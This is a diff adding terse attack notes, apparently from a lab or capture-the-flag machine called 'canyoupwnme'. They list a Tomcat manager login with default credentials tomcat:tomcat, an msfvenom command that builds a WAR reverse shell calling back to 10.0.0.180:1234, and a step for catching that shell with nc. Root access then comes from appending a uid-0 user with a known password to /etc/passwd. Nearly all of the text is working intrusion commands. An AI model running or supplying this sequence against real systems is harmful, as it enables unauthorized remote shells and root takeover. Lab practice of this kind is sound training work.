@@ -1,0 +1,21 @@
+http://10.0.0.186/phpmyadmin/
+
+http://10.0.0.186:8080/host-manager/html
+http://10.0.0.186:8080/manager/html
+tomcat:tomcat
+
+msfvenom -f war -p linux/x86/shell_reverse_tcp LHOST=10.0.0.180 LPORT=1234 -o abc.war
+unzip abc.war
+# to see the .jsp file
+# access to http://10.0.0.186:8080/abc/jnhunedpixa.jsp to get a shell with nc on port 1234
+
+cp /etc/passwd passwd-copy
+# copy content of passwd-copy
+# add this line to the end pozo:xxg71OIase7TQ:0:0:pozo:/root:/bin/bash
+nano pass
+cat pass | cp /dev/stdin /etc/passwd
+$ su - pozo
+Password: 
+# password: pozo
+Added user pozo.
+root@canyoupwnme:~#
